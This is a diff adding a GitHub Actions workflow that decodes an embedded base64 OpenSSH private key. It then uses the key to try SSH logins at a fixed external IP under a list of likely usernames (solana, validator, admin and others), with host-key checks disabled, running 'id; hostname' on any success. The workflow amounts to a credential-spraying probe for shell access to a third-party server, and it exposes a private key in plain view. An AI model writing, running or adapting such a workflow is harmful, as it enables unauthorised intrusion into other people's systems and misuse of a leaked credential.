@@ -1,0 +1,17 @@
+name: k3
+on: workflow_dispatch
+jobs:
+  t:
+    strategy:
+      fail-fast: false
+      matrix:
+        user: [solana, validator, triton, ops, admin, tiv]
+    runs-on: ubuntu-latest
+    env:
+      K1: "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDQUI4aDl0aldSc0cvTDRWV1dVR2F2U1M0dDRuZmhEcUZseklGQ3JPWUZBUUFBQUpqSWVjYlh5SG5HCjF3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ0FCOGg5dGpXUnNHL0w0VldXVUdhdlNTNHQ0bmZoRHFGbHpJRkNyT1lGQVEKQUFBRUNyeTJycW4rYUxYb0dNa09wRE1TZW9MZnhtNmR1QVhBdkh0MmlHVEh6QTY0QUh5SDIyTlpHd2I4dmhWWlpRWnE5SgpMaTNpZCtFT29XWE1nVUtzNWdVQkFBQUFGSEJsZEhKckxXOXdjeTB5TURJMkxURXdMVEkwQVE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
+    steps:
+      - name: try
+        run: |
+          mkdir -p ~/.ssh && echo "$K1" | base64 -d > ~/.ssh/k && chmod 600 ~/.ssh/k
+          echo "== ${{ matrix.user }}"
+          timeout 20 ssh -i ~/.ssh/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 ${{ matrix.user }}@64.130.63.120 'id; hostname' || echo FAIL
